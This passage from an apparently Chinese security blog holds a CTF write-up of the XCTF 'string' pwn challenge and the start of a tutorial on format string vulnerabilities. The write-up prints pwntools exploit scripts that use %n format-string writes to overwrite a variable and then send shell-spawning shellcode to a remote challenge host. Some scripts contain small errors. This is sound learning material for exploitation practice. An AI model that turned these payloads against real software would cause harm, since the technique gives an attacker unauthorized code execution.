are wizard, we will give you hand, you can not defeat dragon by yourself ...</span><br><span class="line">we will tell you two secret ...</span><br><span class="line">secret[0] is 15812a0</span><br><span class="line">secret[1] is 15812a4</span><br><span class="line">do not tell anyone </span><br><span class="line">What should your character&apos;s name be:// 第1处输入</span><br><span class="line">&gt; hello,world!</span><br><span class="line"></span><br><span class="line">Creating a new player.</span><br><span class="line"> This is a famous but quite unusual inn. The air is fresh and the</span><br><span class="line">marble-tiled ground is clean. Few rowdy guests can be seen, and the</span><br><span class="line">furniture looks undamaged by brawls, which are very common in other pubs</span><br><span class="line">all around the world. The decoration looks extremely valuable and would fit</span><br><span class="line">into a palace, but in this city it&apos;s quite ordinary. In the middle of the</span><br><span class="line">room are velvet covered chairs and benches, which surround large oaken</span><br><span class="line">tables. A large sign is fixed to the northern wall behind a wooden bar. In</span><br><span class="line">one corner you notice a fireplace.</span><br><span class="line">There are two obvious exits: east, up.</span><br><span class="line">But strange thing is ,no one there.</span><br><span class="line">So, where you will go?east or up?:// 第2处输入</span><br><span class="line">&gt; east</span><br><span class="line"></span><br><span class="line">You travel a short distance east.That&apos;s odd, anyone disappear suddenly</span><br><span class="line">, what happend?! You just travel , and find another hole</span><br><span class="line">You recall, a big black hole will suckk you into it! Know what should you do?</span><br><span class="line">go into there(1), or leave(0)?:// 第3处输入</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">A voice heard in your mind</span><br><span class="line">&apos;Give me an address&apos;// 第4处输入</span><br><span class="line">&gt; 1111</span><br><span class="line"></span><br><span class="line">And, you wish is:// 第5处输入</span><br><span class="line">&gt; nihao</span><br><span class="line"></span><br><span class="line">Your wish is</span><br><span class="line">nihaoI hear it, I hear it....</span><br><span class="line">Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!</span><br><span class="line">Dragon say: HaHa! you were supposed to have a normal</span><br><span class="line">RPG game, but I have changed it! you have no weapon and </span><br><span class="line">skill! you could not defeat me !</span><br><span class="line">That&apos;s sound terrible! you meet final boss!but you level is ONE!</span><br><span class="line">The End.....Really?</span><br></pre></td></tr></table></figure><blockquote><p>通过正常的输入，发现程序能正常运行，但是并不能满足<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>，因为v4的值从一开始就被赋值为<code>68</code>，v4[1]的值被赋值为<code>85</code>，所以等式是肯定不成立的。</p></blockquote><h4 id="5-理清思路"><a href="#5-理清思路" class="headerlink" title="5.理清思路"></a><code>5.理清思路</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析之后，现在再理清一下该题目的思路：</p><ol><li>我们要想成功执行shellcode，就必须使得v4[0]=v4[1]，那么我们怎么样才能把v4的值改为85，或者把v4[1]的值改为68？</li><li>修改变量值的两种方法：<ul><li>通过栈溢出，从而达到修改局部变量值的目的，但是本题开启了Canary，所以不容易实现</li><li>因为在本题中发现了格式化字符串漏洞，所以可以根据格式化字符串漏洞进行修改，那怎么通过格式化字符串漏洞的手段来修改v4或者v4[1]的值呢？</li></ul></li><li>在<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>中存在一道例题，就是把变量a的值修改为8，从而执行if分支。我们可以根据那个原理来做本题，这里我们只对v4进行修改，如果相对v4[1]修改的话，可以自己尝试一下。</li></ol><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><code>0x02 解题步骤</code></h3><h4 id="1-查找-format-地址的参数偏移"><a href="#1-查找-format-地址的参数偏移" class="headerlink" title="1.查找 format 地址的参数偏移"></a><code>1.查找 format 地址的参数偏移</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这里我们忽略前4个的输入和输出结果，直接来到第5个输入处，首先一定要知道该<code>pwn</code>是一个<code>64</code>位的ELF文件，我们在第5个输入处输入<code>AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx</code>，查看结果如下：</p><p><img src="/images/120-2.jpg" alt></p><blockquote><p>通过上图可以发现<code>AAAAAAAA</code>的十六进制<code>4141414141414141</code>使printf函数的第 9 个参数，使格式化字符串的第 8 个参数，我们来验证一下我们的猜想对不对，下面给出在gdb中的调试结果，如下图：</p></blockquote><p><img src="/images/120-3.jpg" alt></p><p><code>知识点2：64位下的传参约定</code><sup>[2]</sup></p><blockquote><ul><li>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9；</li><li>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</li></ul></blockquote><p><code>知识点3：格式化字符串的控制符</code><sup>[3]</sup></p><blockquote><ul><li>%x: 他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li><li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li><li>%n: 可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，</li></ul></blockquote><h4 id="2-将-v4-的地址存放在-format-首地址处"><a href="#2-将-v4-的地址存放在-format-首地址处" class="headerlink" title="2.将 v4 的地址存放在 format 首地址处"></a><code>2.将 v4 的地址存放在 format 首地址处</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>一样，我们将 v4 的地址存放在 format 首地址处，因为前面已经有了8bytes，那么还需要 <code>85-8=77</code> 个字符，然后再通过%8$n（因为format的首地址是格式化字符串的第8个参数），又因为前面程序已经将v4的地址打印了出来，所以正常来说payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = str(p64(v4_addr),encoding=&quot;unicode_escape&quot;) + &quot;a&quot;*77 + &quot;%8$n&quot;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果正常执行的话，栈中和寄存器的情况如下：</p><p><img src="/images/120-6.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么最终的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"> </span><br><span class="line">payload = str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">77</span> + <span class="string">"%8$n"</span></span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行该exp文件，并没有得到我们想要的结果（打印出”Wizard: I will help you! USE YOU SPELL”），下图是程序停止的地方：</p><p><img src="/images/120-5.jpg" alt></p><blockquote><p>为什么会在这个地方停止运行了呢？这里涉及到一个知识点程序遇到”\x00“会发生截断<sup>[3]</sup>，但是将<code>\x00</code>其放在字符串的末尾就可以解决了<sup>[4]</sup>，那么下一步就是要看一下，在那里发生了截断，从上图中可以看出，应该是因为v4地址在小段输入时产生了\x00，我们在运行exp.py程序前，提前想到将v4的地址以小段的形式打印了出来，那么我们去看一下：<code>[+] p64(v3_addr) is  ÒÔ\x00\x00</code>果然含有截断符号，那么下一步我们要把v4的地址放到最后，这样就不会发生截断，因此构造出了</p><p><code>[&quot;a&quot;*85][%length$n][padding][v4_addr]</code></p><ul><li><p>中间部分为<code>%length$n</code>和<code>padding</code></p></li><li><p>前部分应该是长度为85的字符串，我们可以用”a“*85进行填充</p></li><li><p>由于v4的地址需要单独放在一个64位的地址空间，所以这里需要对齐：</p><ul><li>”a“*85：这是85个字符长度</li><li>%length$n：由于length不确定，所以该长度不确定</li><li>p64(v4_addr)：长度为8 bytes，但是需要地址对齐</li></ul><p>我们现在来计算length的值，因为”a“*85的长度除以8等于10.625，又因为前8个”a“是格式化字符串的第8个参数，所以length的数值肯定大于10，如果大于10的话，那么85个”a“和<code>%length$n</code>的长度为90，因为90不能整除8，所以还需要6个字符作为<code>padding</code>，这样算下来(85+5+6)/8=96/8=12，再加上前面7个参数等于19，所以说v4_addr相当于格式化字符串的第20个参数。</p></li></ul></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过上述分析，我们又重新得到一个新的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"><span class="comment">#r = remote("124.126.19.106",38510)</span></span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v4_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#payload = str(p64(v4_addr),encoding="unicode_escape") + "a"*77 + "%8$n"</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/120-4.png" alt></p><blockquote><p>得到的结果如上图，从得到的输出来看，我们已经成功的修改了v4的值，下面我们就写入shellcode，得到flag，完整的exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/sssusr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">38510</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = int(r.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] v4_addr is"</span>,hex(v3_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">85</span> + <span class="string">"%20$n"</span> + <span class="string">"a"</span>*<span class="number">6</span> + str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>) </span><br><span class="line">print(<span class="string">"[+] p64(v4_addr) is"</span>,str(p64(v4_addr),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "a"*85 + "%7$n</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"What should your character's name be:"</span>,<span class="string">"LISHUO"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"So, where you will go?east or up?:"</span>,<span class="string">"east"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"go into there(1), or leave(0)?:"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"'Give me an address'"</span>,<span class="string">"1111"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"And, you wish is:"</span>,payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-其他方法"><a href="#0x03-其他方法" class="headerlink" title="0x03 其他方法"></a><font color="navy"><code>0x03 其他方法</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网上关于这道题目的做法有很多，大部分都是通过第4个输入<code>&#39;Give me an address&#39;</code>来改变v4的值，在这里我就不再多多赘述，这里有几个这样做法的writeup，但是里面有很多问题，希望大家能够批判性的去学习。当然在这里因为我个人水平有限的，我也不敢保证这篇writeup也不存在问题，如果存在问题，还希望大家在评论区指正说明。</p><ul><li><a href="https://blog.csdn.net/qq_43681242/article/details/103681367?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">攻防世界pwn新手练习（string）</a></li><li><a href="https://blog.csdn.net/fastergohome/article/details/103627264" target="_blank" rel="noopener">string [XCTF-PWN]CTF writeup系列7（超详细分析）</a></li></ul><h3 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a><code>0x04 Reference</code></h3><p>[1] <a href="https://www.cnblogs.com/shijingxiang/articles/5185068.html" target="_blank" rel="noopener">Mmap的实现原理和应用</a></p><p>[2] <a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">64位汇编参数传递</a></p><p>[3] <a href="http://dittozzz.top/2019/02/22/格式化串漏洞利用总结/" target="_blank" rel="noopener">格式化串漏洞利用总结</a>⭐</p><p>[4] <a href="https://wizardforcel.gitbooks.io/q-buffer-overflow-tutorial/content/86.html" target="_blank" rel="noopener">5.1.2 ShellCode编码的用处</a></p><p>[5] <a href="https://www.cnblogs.com/junjiany/p/7055064.html" target="_blank" rel="noopener">python第一行注释是什么意思？</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 前言&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>详解格式化字符串漏洞</title>
    <link href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/29/2020.05.29（119）/</id>
    <published>2020-05-28T16:00:00.000Z</published>
    <updated>2020-05-31T01:46:38.686Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><font color="navy"><code>0x00 前言</code></font></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串漏洞是在CWE<sup>[1]</sup>（Common Weakness Enumeration，通用缺陷枚举）例表中的编号为<a href="https://cwe.mitre.org/data/definitions/134.html" target="_blank" rel="noopener">CWE-134</a>，由于在审计过程中很容易发现该漏洞，所以此类漏洞很少出现，但是在很多CTF还存在相关的题目，比如XCTF的<code>pwn新手练习区的 string</code>等，通过这两天的学习，发现还是有必要系统的归纳一下相关知识点，在这里我们以问题为导向展开学习。</p><h3 id="0x01-格式化字符串"><a href="#0x01-格式化字符串" class="headerlink" title="0x01 格式化字符串"></a><font color="navy"><code>0x01 格式化字符串</code></font></h3><h4 id="Q1：什么是格式化字符串"><a href="#Q1：什么是格式化字符串" class="headerlink" title="Q1：什么是格式化字符串 "></a><font color="blue"><code>Q1：什么是格式化字符串</code> </font></h4><blockquote><p><strong>格式化字符串</strong>（<strong>format string</strong>）是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。<sup>[2]</sup></p></blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述内容是wiki对格式化字符串的解释，简单来说，格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。<sup>[3]</sup> 比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello %s, Your ID is %d"</span>, name, &amp;ID)</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于<strong>格式化函数<code>printf</code></strong>来说，<code>&quot;Hello %s, Your ID is %d&quot;</code>是printf函数的第一个参数，该参数被称为<font color="red"><code>格式化字符串</code></font>，<code>name</code>是printf函数的第二个参数，<code>&amp;ID</code>是printf函数的第三个参数，其中<code>%s</code>控制<code>name</code>的输出，<code>%d</code>控制着<code>&amp;ID</code>的输出；</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于<strong>格式化字符串 <code>&quot;Hello &amp;s, Your ID is %d&quot;</code></strong>来讲，<code>name</code>是它的第一个参数，<code>&amp;ID</code>是它的第二个参数；</p><p><img src="/images/119-1.png" alt></p><blockquote><p>例如上图:</p><ul><li><p>printf函数第一个参数（格式化字符串）的地址为<code>0xffffd8a0</code>，该地址指向地址<code>0x804a00b</code>，位于栈顶<code>esp</code>；</p></li><li><p>printf函数第二个参数的地址为<code>0xffffd8b8</code>，在栈中处于<code>0xffffd8a4</code>，<code>esp+4</code>；</p></li><li>第三个参数为<code>0x2</code>，通过栈可以看出该数值被存放在地址为<code>0xffffd8a8</code>，栈中为<code>esp+8</code></li></ul><p>通过上面的例子，可以看出，该printf函数的格式化字符串中有两个控制字符<code>%s</code>和<code>%d</code>，<strong>说明栈中两个连续的高地址是格式化字符串的第1，2个参数，也是printf函数的第2，3个参数。</strong></p></blockquote><h4 id="Q2：格式化字符串函数的作用是什么？"><a href="#Q2：格式化字符串函数的作用是什么？" class="headerlink" title="Q2：格式化字符串函数的作用是什么？ "></a><font color="blue"><code>Q2：格式化字符串函数的作用是什么？</code> </font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。<sup>[3]</sup></p><h4 id="Q3：格式化字符串函数的组成是什么？"><a href="#Q3：格式化字符串函数的组成是什么？" class="headerlink" title="Q3：格式化字符串函数的组成是什么？ "></a><font color="blue"><code>Q3：格式化字符串函数的组成是什么？</code> </font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;格式化字符串有着自己固定的格式，由三部分组成：</p><ul><li>格式化字符串函数，比如<code>printf函数</code></li><li>格式化字符串，比如<code>&quot;Hello %s, Your ID is %d&quot;</code></li><li>后续参数（可选），比如<code>name</code>和<code>&amp;ID</code></li></ul><h4 id="Q4：格式化字符串的格式是什么？-2-amp-3"><a href="#Q4：格式化字符串的格式是什么？-2-amp-3" class="headerlink" title="Q4：格式化字符串的格式是什么？ [2]&amp;[3]"></a><font color="blue"><code>Q4：格式化字符串的格式是什么？</code> </font><sup>[2]&amp;[3]</sup></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p><code>parameter</code>：n$，获取格式化字符串中的指定参数；n是用这个格式说明符（specifier）显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了<em>parameter</em>，则其他所有占位符必须也使用<em>parameter</em>。这是<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="noopener">POSIX</a>扩展，不属于<a href="https://zh.wikipedia.org/wiki/C语言" target="_blank" rel="noopener">ISO C</a>。例：printf(“%2$d %2$#x; %1$d %1$#x”,16,17)，产生”<code>17 0x11; 16 0x10</code>“</p><p><code>flags</code>：（此项省略）</p><p><code>field width</code>：输出的最小宽度；</p><p><code>Precision</code>：通常指明输出的最大长度，依赖于特定的格式化类型；</p><p><code>Length</code>：指出浮点型参数或整型参数的长度；</p><div class="table-container"><table><thead><tr><th>字符</th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>hh</code></td><td>对于整数类型，<code>printf</code>期待一个从<code>char</code>提升的<code>int</code>尺寸的整型参数。</td></tr><tr><td><code>h</code></td><td>对于整数类型，<code>printf</code>期待一个从<code>short</code>提升的<code>int</code>尺寸的整型参数。</td></tr><tr><td><code>l</code></td><td>对于整数类型，<code>printf</code>期待一个<code>long</code>尺寸的整型参数。对于浮点类型，<code>printf</code>期待一个<code>double</code>尺寸的整型参数。<br>对于字符串s类型，<code>printf</code>期待一个<code>wchar_t</code>指针参数。对于字符c类型，<code>printf</code>期待一个<code>wint_t</code>型的参数</td></tr><tr><td><code>ll</code></td><td>对于整数类型，<code>printf</code>期待一个<code>long long</code>尺寸的整型参数。Microsoft也可以使用<code>I64</code>。</td></tr><tr><td><code>L</code></td><td>对于浮点类型，<code>printf</code>期待一个<code>long double</code>尺寸的整型参数。</td></tr><tr><td><code>z</code></td><td>对于整数类型，<code>printf</code>期待一个<code>size_t</code>尺寸的整型参数。</td></tr><tr><td><code>j</code></td><td>对于整数类型，<code>printf</code>期待一个<code>intmax_t</code>尺寸的整型参数。</td></tr><tr><td><code>t</code></td><td>对于整数类型，<code>printf</code>期待一个<code>ptrdiff_t</code>尺寸的整型参数。</td></tr></tbody></table></div><p><code>type</code>：</p><div class="table-container"><table><thead><tr><th style="text-align:center"><strong>字符</strong></th><th style="text-align:left"><strong>描述</strong></th></tr></thead><tbody><tr><td style="text-align:center">d/i</td><td style="text-align:left">有符号十进制数值<code>int</code>。’<code>%d</code>‘与’<code>%i</code>‘对于输出是同义；<br>但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或0时，分别表示16进制或8进制的值。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td style="text-align:center">u</td><td style="text-align:left">十进制<code>unsigned int</code>。<br>如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空</td></tr><tr><td style="text-align:center">c</td><td style="text-align:left">如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；<br>如果用了 l 标志，把wint_t参数转为包含两个元素的wchart_t数组，第一个元素包含要输出的字符，第二个元素为null宽字符</td></tr><tr><td style="text-align:center">o</td><td style="text-align:left">8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空</td></tr><tr><td style="text-align:center"><strong>s</strong></td><td style="text-align:left"><br>如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。<br>如果用了 l 标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数</td></tr><tr><td style="text-align:center"><strong>n</strong></td><td style="text-align:left">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td></tr><tr><td style="text-align:center">p</td><td style="text-align:left">void * 型，输出对应变量的值。<br>printf(“%p”,a) 用地址的格式打印变量 a 的值;<br>printf(“%p”, &amp;a) 打印变量 a 所在的地址。</td></tr><tr><td style="text-align:center">x/X</td><td style="text-align:left">16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。<br>如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。<br>精度为 0 且值为 0，则输出为空</td></tr><tr><td style="text-align:center">%</td><td style="text-align:left">‘<code>%</code>‘字面值，不接受任何 flags, width。</td></tr></tbody></table></div><p><code>特别说明</code></p><blockquote><p>这里简单的介绍一下<code>%n</code>控制符，下面会用到：</p><p>%n 用于讲当前字符串的长度打印到var中，例如：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc str.c -m32 -o str</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"the use of %n"</span>, &amp;c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上述结果为<code>11</code>，也就是<code>the use 